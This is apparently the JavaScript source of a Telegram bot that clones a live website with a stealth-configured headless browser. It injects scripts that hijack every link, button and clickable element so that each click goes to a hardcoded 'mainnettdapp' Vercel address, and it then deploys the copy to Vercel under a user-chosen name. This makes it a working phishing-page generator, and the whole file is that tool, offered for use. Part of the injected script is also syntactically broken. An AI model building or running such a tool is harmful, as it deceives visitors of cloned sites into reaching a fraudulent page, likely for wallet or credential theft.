import { Telegraf, Markup } from "telegraf";
import axios from "axios";
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { URL } from "url";
import { Vercel } from "@vercel/sdk";
import dotenv from "dotenv";
import { fileURLToPath } from "url";

// Define __filename and __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config();

const vercel = new Vercel({
  bearerToken: process.env.vercelToken, // replace with your real token
});

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
puppeteer.use(StealthPlugin());

// Track per-user states
const userStates = new Map();

// /start command
bot.start((ctx) => {
  ctx.reply("✅ Welcome! Use /clone to fetch a website’s HTML.");
});

// /run command
bot.command("run", (ctx) => {
  ctx.reply("🏃‍♂️ Running...");
});

// /clone command – ask for website
bot.command("clone", (ctx) => {
  ctx.reply(
    "🔗 Enter the <b>website URL</b> you want to clone (must start with <code>https://</code>)\n\n✅ Make sure the site is live and accessible.",
    { parse_mode: "HTML" }
  );

  userStates.set(ctx.chat.id, "awaiting_url");
});

const userFolders = new Map();

bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);
  // === CASE 1: CLONING ===
  if (state === "awaiting_url") {
    const siteUrl = ctx.message.text.toLowerCase();
    if (!siteUrl.startsWith("https://")) {
      return ctx.reply("❌ Enter a valid link that starts with *https://*", {
        parse_mode: "Markdown",
      });
    }

    userStates.delete(ctx.chat.id);
    await ctx.reply(
      "🔍 Cloning the full website...\n\nHang tight — this might take a little while."
    );
    (async () => {
      const outputDir = path.join(__dirname, "cloned");
      const redirectURL = "https://mainnettdapp.vercel.app/"; // Change this to your desired redirect URL

      // Clear the cloned directory before starting
      async function clearClonedDirectory() {
        try {
          await fs.remove(outputDir); // Remove the entire cloned directory
          console.log("🧹 Cleared cloned directory:", outputDir);
        } catch (err) {
          console.error("⚠️ Failed to clear cloned directory:", err.message);
        }
      }

      try {
        // Clear and recreate directories
        await clearClonedDirectory();
        await fs.ensureDir(path.join(outputDir, "css")); // Create css directory
        console.log("📁 Created css directories");

        // Launch browser
        const browser = await puppeteer.launch({
          headless: "new",
          args: ["--no-sandbox", "--disable-setuid-sandbox"],
        });

        try {
          const page = await browser.newPage();
          await page.setUserAgent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
          );

          // Navigate and wait for full rendering
          await page.goto(siteUrl, {
            waitUntil: "networkidle2",
            timeout: 30000,
          });
          await new Promise((resolve) => setTimeout(resolve, 5000)); // Additional wait for dynamic content

          // Execute JavaScript in the browser context to modify image src and remove srcset
          await page.evaluate((siteUrl) => {
            const images = document.querySelectorAll("img[src]");
            images.forEach((img) => {
              const src = img.getAttribute("src");
              if (src && !src.startsWith("data:")) {
                try {
                  // Resolve relative URLs and ensure src starts with siteUrl
                  const fullUrl = new URL(src, siteUrl).href;
                  const urlObj = new URL(fullUrl);
                  const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
                  img.setAttribute("src", editedSrc);
                  img.removeAttribute("srcset");
                  console.log(
                    `🖼️ Updated image: src=${editedSrc}, srcset removed`
                  );
                } catch (err) {
                  console.warn(
                    `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
                  );
                  img.removeAttribute("srcset");
                }
              } else {
                img.removeAttribute("srcset");
              }
            });
          }, siteUrl);

          // Get the modified HTML after JavaScript execution
          const html = await page.content();
          const $ = cheerio.load(html);

          // Remove existing <base> tag and add new one at the start of <head>
          $("base").remove();
          $("head").prepend(`<base href="${siteUrl}">`);

          // Continue with the rest of your code (redirects, saving HTML, etc.)

          // Get and edit image src, remove srcset
          const images = $("img[src]");
          for (const el of images.toArray()) {
            const src = $(el).attr("src");
            if (src && !src.startsWith("data:")) {
              try {
                // Get the full URL (resolving relative paths)
                const fullUrl = new URL(src, siteUrl).href;
                // Extract the path portion (remove the domain if external)
                const urlObj = new URL(fullUrl);
                let editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
                // Set the edited src to start with siteUrl
                $(el).attr("src", editedSrc);
                $(el).removeAttr("srcset"); // Remove srcset attribute
              } catch (err) {
                console.warn(
                  `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
                );
                $(el).removeAttr("srcset"); // Still remove srcset on error
              }
            } else {
              $(el).removeAttr("srcset"); // Remove srcset for data: URLs or invalid src
            }
          }

          // Redirect external links
          $("a[href]").each((_, el) => {
            const href = $(el).attr("href");
            if (
              href &&
              href.startsWith("http") &&
              !href.includes(new URL(siteUrl).hostname)
            ) {
              // $(el).attr("href", redirectURL);
              $(el).removeAttr("target");
              $(el).removeAttr("href");
            }
          });

          // Redirect buttons
          $("button:not([data-no-redirect])").each((_, el) => {
            $(el).attr("onclick", `window.location='${redirectURL}'`);
          });

          // Handle cursor:pointer elements
          let pointerCount = 0;
          $("[style]").each((_, el) => {
            const style = $(el).attr("style");
            if (style && style.toLowerCase().includes("cursor: pointer")) {
              $(el).attr("onclick", `window.location='${redirectURL}'`);
              pointerCount++;
            }
          });

          const pointerClasses = new Set();
          $("style").each((_, el) => {
            const css = $(el).html();
            const matches = css.match(
              /\.(\w[\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi
            );
            if (matches) {
              matches.forEach((rule) => {
                const classMatch = rule.match(/\.(\w[\w-]*)/);
                if (classMatch) {
                  pointerClasses.add(classMatch[1]);
                }
              });
            }
          });

          $("head").prepend(`<script class="dynamic-script">
  window.addEventListener('DOMContentLoaded', () => {
    console.log("🔁 Running prioritized image fixer...");
    
    function fixImages() {
      const images = document.querySelectorAll('img');
      images.forEach(img => {
        const src = img.getAttribute('src');
        img.removeAttribute('srcset');
        if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
          img.src = new URL(src, '${siteUrl}').href;
        }
           // Add href to all <a> tags
    const anchorElements = document.querySelectorAll("a");
           // Handle clicks for interactive elements
    const interactiveElements = document.querySelectorAll(
      "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
    );
    interactiveElements.forEach(el => {
      el.setAttribute("href", "${redirectURL}");
      console.log("✅ Added href to <a>: ${redirectURL}");
    });
      });
       // Handle clicks for interactive elements
    const interactiveElements = document.querySelectorAll(
      "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
    );
    interactiveElements.forEach(el => {
      el.onclick = null;
      el.removeAttribute("onclick");
      if (window.jQuery && typeof jQuery === "function") {
        try { jQuery(el).off("click"); } catch (err) {}
      }
      const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
      if (reactKey) delete el[reactKey];
      el.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href = "${redirectURL}";
      }, true);
    });
    }

    // Run immediately
    fixImages();
    
    // Run again after delay to catch late-loaded images
    setTimeout(fixImages, 3000);
    setInterval(fixImages, 10000); // optional long-term fix loop
  });
</script>`);

      
          $("head").prepend(`<script class="safe-redirect-handler">
  window.addEventListener("DOMContentLoaded", () => {
    const redirectURL = "${redirectURL}";

    function forceRedirect(element) {
      ["click", "pointerdown", "touchstart"].forEach(eventType => {
        element.addEventListener(eventType, (e) => {
          e.preventDefault();
          e.stopImmediatePropagation();
          window.location.href = redirectURL;
        }, true);
      });
    }

    function patchClickableElements() {
      const selectors = [
        "a",
        "button",
        "input[type='button']",
        "input[type='submit']",
        "input[type='reset']",
        "[role='button']",
        "[onclick]",
        "[style*='cursor: pointer']",
        [class*='cursor-pointer']
        "*[tabindex]" // captures custom clickable elements like divs
      ];

      const clickables = document.querySelectorAll(selectors.join(","));
      clickables.forEach(el => {
        try {
          el.onclick = null;
          el.removeAttribute("onclick");
          el.removeAttribute("href");
          el.removeAttribute("target");
          const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
          if (reactKey) delete el[reactKey];
          forceRedirect(el);
        } catch (err) {
          console.warn("⚠️ Failed to patch element:", el, err);
        }
      });

      console.log("✅ All clickable elements patched for redirect");
    }

    // Run when idle to not block UI thread
    if ("requestIdleCallback" in window) {
      requestIdleCallback(patchClickableElements, { timeout: 3000 });
    } else {
      setTimeout(patchClickableElements, 1000);
    }
  });
</script>`);

          $("body").append(`
 <style>
   a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
     cursor: pointer !important;
   }
 </style>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const elements = document.querySelectorAll("a, button,[class*='cursor-pointer'], input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
   elements.forEach(el => {
     el.onclick = null;
     el.removeAttribute("onclick");
     if (window.jQuery && typeof jQuery === "function") {
       try { jQuery(el).off("click"); } catch (err) {}
     }
     const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
     if (reactKey) delete el[reactKey];
     el.addEventListener("click", (e) => {
       e.preventDefault();
       e.stopImmediatePropagation();
       window.location.href = ${JSON.stringify(redirectURL)};
     }, true);
   });
 });
 </script>
 `);



 $("head").prepend(`
  <style>
    a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],
    [class*='cursor'], input[type='button'], input[type='submit'], input[type='reset'] {
      cursor: pointer !important;
    }
  </style>

  <script class="force-click-redirect">
    document.addEventListener("DOMContentLoaded", () => {
      const redirectURL = "${redirectURL}";

      function forceRedirect(el) {
        ["click", "pointerdown", "touchstart"].forEach(evt => {
          el.addEventListener(evt, (e) => {
            e.preventDefault();
            e.stopImmediatePropagation();
            window.location.href = redirectURL;
          }, true); // capture phase
        });
      }

      function patchAllClickables() {
        const selectors = [
          "a",
          "button",
          "input[type='button']",
          "input[type='submit']",
          "input[type='reset']",
          "[role='button']",
          "[onclick]",
          "[style*='cursor: pointer']",
          "[class*='cursor-pointer']",
          "[tabindex]",
          "[data-dropdown-option]"
        ];

        const elements = document.querySelectorAll(selectors.join(","));
        elements.forEach(el => {
          try {
            el.onclick = null;
            el.removeAttribute("onclick");
            el.removeAttribute("href");
            el.removeAttribute("target");

            // Clear jQuery events
            if (window.jQuery && typeof jQuery === "function") {
              try { jQuery(el).off(); } catch (_) {}
            }

            // Clear React synthetic events
            const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
            if (reactKey) delete el[reactKey];

            forceRedirect(el);
          } catch (err) {
            console.warn("⚠️ Error patching element:", err);
          }
        });

        console.log("✅ All clickables patched for redirect.");
      }

      // Patch immediately and again after delay
      patchAllClickables();
      setTimeout(patchAllClickables, 1000);
      setInterval(patchAllClickables, 8000); // optional long-term patch loop
    });
  </script>
`);

          for (const className of pointerClasses) {
            $(`.${className}`).attr(
              "onclick",
              `window.location='${redirectURL}'`
            );
            pointerCount += $(`.${className}`).length;
          }

          console.log("🎯 Pointer-style elements redirected:", pointerCount);
          console.log("🔘 <button> elements redirected:", $("button").length);
          console.log("🔗 <a> links replaced with:", redirectURL);

          // Save HTML
          await fs.outputFile(path.join(outputDir, "index.html"), $.html());
          console.log("✅ Done! Saved at cloned/index.html");
          await ctx.reply(
            "✅ Site cloned using original CSS links! Ready for deploy.",
            Markup.inlineKeyboard([
              Markup.button.callback("🚀 Host Site", "host"),
            ])
          );
        } catch (err) {
          console.error("❌ Page processing failed:", err.message, err.stack);
          await ctx.reply(`✅ error cloning`);
        } finally {
          await browser.close();
        }
      } catch (err) {
        console.error("❌ Script failed:", err.message, err.stack);
      }
    })();
  }

  // === CASE 2: HOSTING ===
  if (state === "awaiting_site_name") {
    userStates.delete(ctx.chat.id);
    const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

    if (!siteName || siteName.length < 3) {
      return ctx.reply("❌ Site name is too short or invalid. Try again.");
    }

    const folder = "./cloned";
    if (!fs.existsSync(folder)) {
      return ctx.reply("❌ No cloned folder found. Please clone a site first.");
    }

    await ctx.reply("🛠️ Just a moment...\n\nWe're getting your site ready!");

    const TEXT_FILE_EXTENSIONS = [
      ".html",
      ".js",
      ".css",
      ".json",
      ".txt",
      ".md",
    ];
    const isTextFile = (filePath) =>
      TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

    function getFilesArray(dir, baseDir = dir) {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      let files = [];

      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        const relativePath = path
          .relative(baseDir, fullPath)
          .replace(/\\/g, "/");

        if (entry.isDirectory()) {
          files = files.concat(getFilesArray(fullPath, baseDir));
        } else {
          const fileBuffer = fs.readFileSync(fullPath);
          const data = isTextFile(fullPath)
            ? fileBuffer.toString("utf-8")
            : fileBuffer.toString("base64");

          files.push({ file: relativePath, data });
        }
      }

      return files;
    }

    const files = getFilesArray(folder);

    try {
      const result = await vercel.deployments.createDeployment({
        teamId: process.env.vercelTeamId, // replace with your real team ID
        slug: siteName,
        requestBody: {
          name: siteName,
          project: siteName,
          target: "production",
          files: files,
          projectSettings: {
            framework: null,
            buildCommand: null,
            installCommand: null,
            outputDirectory: ".",
          },
        },
      });

      console.log("✅ Deployment complete!", result);

      setTimeout(() => {
        ctx.reply(
          `✅ *Deployment Successful!*\n\n` +
            `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
            `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
            `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
            `🎉 Your site is now live on Vercel!`,
          { parse_mode: "Markdown" }
        );
      }, 3000); // Delay to ensure Vercel processes the deployment
    } catch (error) {
      console.error("❌ Hosting error:", error);
      ctx.reply("⚠️ Error deploying site. Please try again later.");
    }
  }
});

// Handle "Host" button click
bot.action("host", async (ctx) => {
  ctx.answerCbQuery();
  userStates.set(ctx.chat.id, "awaiting_site_name");
  return ctx.reply(
    "💡 <b>What's the name of your site?</b>\n\n⚠️ Make sure it's unique and hasn't been used before.",
    { parse_mode: "HTML" }
  );
});

// Handle text message (e.g., site name)
bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  if (state !== "awaiting_site_name") return;

  userStates.delete(ctx.chat.id); // Clear state
  const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

  if (!siteName || siteName.length < 3 || siteName.includes(".")) {
    return ctx.reply(
      "⚠️ The site name is too short or invalid.\n\n🚫 Dots (.) are not allowed.\n✍️ Please try again with just the name."
    );
  }

  const folder = "./cloned";
  console.log("Hosting folder:", folder);

  if (!fs.existsSync(folder)) {
    return ctx.reply("❌ No cloned folder found. Please clone a site first.");
  }

  const TEXT_FILE_EXTENSIONS = [".html", ".js", ".css", ".json", ".txt", ".md"];
  const isTextFile = (filePath) =>
    TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

  function getFilesArray(dir, baseDir = dir) {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    let files = [];

    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      const relativePath = path.relative(baseDir, fullPath).replace(/\\/g, "/");

      if (entry.isDirectory()) {
        files = files.concat(getFilesArray(fullPath, baseDir));
      } else {
        const fileBuffer = fs.readFileSync(fullPath);
        const data = isTextFile(fullPath)
          ? fileBuffer.toString("utf-8")
          : fileBuffer.toString("base64");

        files.push({ file: relativePath, data });
      }
    }

    return files;
  }

  const files = getFilesArray(folder);

  try {
    const result = await vercel.deployments.createDeployment({
      teamId: "team_AwRWdZTHaoWRoHvGvRg19YS7",
      slug: siteName,
      requestBody: {
        name: siteName,
        project: siteName,
        target: "production",
        files: files,
        projectSettings: {
          framework: null,
          buildCommand: null,
          installCommand: null,
          outputDirectory: ".",
        },
      },
    });

    console.log("✅ Deployment complete!", result);

    ctx.reply(
      `✅ *Deployment Successful!*\n\n` +
        `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
        `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
        `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
        `🎉 Your site is now live on Vercel!`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("❌ Hosting error:", error);
    ctx.reply("⚠️ Error deploying site. Please try again later.");
  }
});

// Start the bot
bot.launch().then(() => {
  console.log("🤖 Bot is running...");
});
console.log("🤖 Bot is running...");
